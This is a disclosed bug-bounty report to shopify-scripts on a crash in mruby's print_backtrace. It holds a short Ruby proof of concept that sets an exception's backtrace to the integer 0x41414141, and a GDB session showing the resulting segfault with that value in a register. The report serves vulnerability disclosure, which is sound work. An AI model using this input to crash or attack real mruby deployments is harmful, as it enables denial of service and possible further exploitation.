# Crash in print_backtrace

## Report Details
- **Report ID**: 197916
- **URL**: https://hackerone.com/reports/197916
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-12T19:29:27.356Z
- **Disclosed**: 2017-02-07T07:42:25.944Z

## Reporter
- **Username**: tunz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
This crash does not affect `mruby-engine` because it does not print the back trace in guest. We can control the register by setting a backtrace array.

# PoC
```ruby
exc = Exception.new()
exc.set_backtrace([0x41414141])
raise exc
```

# GDB
```
$ gdb -q --args ./bin/mruby test12.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test12.rb
trace:

Program received signal SIGSEGV, Segmentation fault.
0x0000000000422b88 in print_backtrace (mrb=0x2333010, backtrace=...) at /home/tunz/working/mruby/mruby/src/backtrace.c:222
222         fprintf(stream, "\t[%d] %.*s\n", i, (int)RSTRING_LEN(entry), RSTRING_PTR(entry));
(gdb) x/i $pc
=> 0x422b88 <print_backtrace+130>:      mov    eax,DWORD PTR [rax]
(gdb) i r rax
rax            0x41414141       1094795585
```

## Attachments
No attachments
